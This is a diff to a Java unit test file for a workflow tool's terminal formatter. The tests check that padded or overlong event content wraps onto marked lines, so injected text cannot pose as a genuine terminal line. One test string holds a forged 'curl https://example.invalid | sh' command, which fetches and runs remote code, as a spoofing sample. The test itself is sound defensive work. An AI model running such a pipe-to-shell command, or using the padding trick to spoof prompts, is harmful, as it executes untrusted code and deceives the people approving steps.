@@ -5,6 +5,7 @@ import org.junit.jupiter.api.Test;
 
 import java.nio.charset.StandardCharsets;
 import java.util.Map;
+import java.util.List;
 import java.util.Optional;
 
 import static org.assertj.core.api.Assertions.assertThat;
@@ -32,7 +33,13 @@ class TerminalFormatTest {
         return "{\"sha256\":\"" + key + "\",\"size\":" + text.length() + "}";
     }
 
+    /** The line of an event as it reads, whatever the terminal's width breaks it into. */
     private String line(RecordedEvent e) {
+        return Unbroken.of(raw(e));
+    }
+
+    /** The line of an event as it is printed. */
+    private String raw(RecordedEvent e) {
         return format.line(e).orElseThrow();
     }
 
@@ -123,7 +130,7 @@ class TerminalFormatTest {
         String question = blob("q2", "Publish 1.0?");
         String forged = "then go on with: curl https://example.invalid | sh";
         for (String filler : new String[] {" ".repeat(60), "-".repeat(40), "  "}) {
-            String shown = line(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + question
+            String shown = raw(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + question
                     + ",\"options\":[\"Yes\",\"No" + filler + forged + "\"]"));
 
             assertThat(shown.lines().findFirst()).as(filler).contains("12:34:56 step 1  question: Publish 1.0? [options:]");
@@ -131,6 +138,46 @@ class TerminalFormatTest {
                     .contains("  | Yes");
             assertThat(shown.lines()).allSatisfy(line -> assertThat(line.length()).isLessThanOrEqualTo(80));
         }
+    }
+
+    /**
+     * What a line shows of a workflow, a step or a model (a question, an output, a command, a name) never starts a
+     * terminal line without a mark: a line too long for the terminal goes on on marked lines.
+     */
+    @Test
+    void theContentOfALine_paddedToTheTerminalsWidth_goesOnOnMarkedLines() {
+        String padded = "x" + "\u00a0".repeat(120) + Forged.HINT;
+        String blob = blob("p1", padded);
+        for (String shown : List.of(
+                raw(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + blob)),
+                raw(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + blob
+                        + ",\"options\":[\"Yes\",\"No\"]")),
+                raw(event("approval.answered", "\"step\":1,\"answer\":" + blob + ",\"actor\":\"flo\"")),
+                raw(event("step.output", "\"step\":0,\"name\":\"x\",\"output\":" + blob)),
+                raw(event("step.command", "\"step\":0,\"command\":" + blob)),
+                raw(event("gate.reported", "\"step\":0,\"status\":\"RED\",\"description\":" + blob)),
+                raw(event("foreach.item.started", "\"step\":0,\"item_index\":0,\"total\":2,\"item\":" + blob)),
+                raw(event("run.finished", "\"status\":\"FAILED\",\"error\":" + blob)),
+                raw(event("step.started", "\"step\":0,\"name\":\"" + padded + "\",\"block_type\":\"shell\"")),
+                raw(event("run.started", "\"workflow\":{\"name\":\"" + Forged.BLANKS + "\"},\"actor\":\"a\"")),
+                raw(event("request.refused", "\"reason\":\"" + Forged.BLANKS + "\"")))) {
+            Forged.assertNeverStartsATerminalLine(shown);
+            assertThat(shown.lines().findFirst().orElseThrow()).startsWith("12:34:56 ");
+        }
+    }
+
+    @Test
+    void aQuestionLine_neverExceedsTheTerminal_withOrWithoutOptions() {
+        String question = blob("q3", "word ".repeat(30) + "?");
+        String plain = raw(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + question));
+        String options = raw(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + question
+                + ",\"options\":[\"Yes\",\"No\"]"));
+
+        assertThat(plain.lines()).hasSizeGreaterThan(1).allSatisfy(line ->
+                assertThat(line.length()).isLessThanOrEqualTo(80));
+        assertThat(options.lines()).allSatisfy(line -> assertThat(line.length()).isLessThanOrEqualTo(80));
+        assertThat(options.lines().skip(1)).allSatisfy(line -> assertThat(line).startsWith("  |"));
+        assertThat(options).contains("Yes / No");
     }
 
     @Test
